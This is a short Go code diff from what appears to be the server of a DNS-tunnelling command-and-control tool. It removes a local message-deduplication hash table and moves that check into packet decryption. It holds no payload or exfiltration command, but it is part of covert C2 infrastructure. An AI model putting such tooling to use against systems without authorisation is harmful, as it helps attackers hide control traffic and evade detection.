@@ -45,7 +45,6 @@ var serverPacketBuffersWithSignature = make(map[int][]c2.MessagePacketWithSignat
 
 // 3d buffer for public key and parentpartID. first string is the public key
 var outgoingBuffer = make(map[string]map[uint16][]string)
-var dedupHashTable = make(map[uint64]bool)
 
 // dedupPrevMsgHash is only for consecutive message duplicates
 var dedupPrevMsgHash uint64
@@ -358,27 +357,13 @@ func messageSetHealthIntervalHandler(Packet c2.MessagePacketWithSignature, q *dn
 	return nil
 }
 
-func isMsgDuplicate(data []byte) bool {
-	// dedup checks
-	skipForDudup := false
-	hash := c2.FNV1A(data)
-	_, ok := dedupHashTable[hash] // check for existence
-	if !ok {
-		dedupHashTable[hash] = true
-	} else {
-		skipForDudup = true
-	}
-
-	return skipForDudup
-}
-
 func parseQuery(m *dns.Msg) error {
 	// since the C2 works by A questions at the moment, we cna check dedup by looking at the first question
-	// todo: test this
-	if isMsgDuplicate([]byte(m.Question[0].Name)) {
-		Config.io.Logger(INFO, "Duplicate message received, discarding")
-		return nil
-	}
+	// moved this to decrypt incoming packet
+	// if !c2.DedupHashTable.Add([]byte(m.Question[0].Name)) {
+	// 	Config.io.Logger(INFO, "Duplicate message received, discarding")
+	// 	return nil
+	// }
 	outs, skip, err := c2.DecryptIncomingPacket(m, Config.DNSSuffix, Config.privateKey, nil)
 	if err != nil {
 		Config.io.Logger(INFO, "Error in Decrypting incoming packet: %v", err)
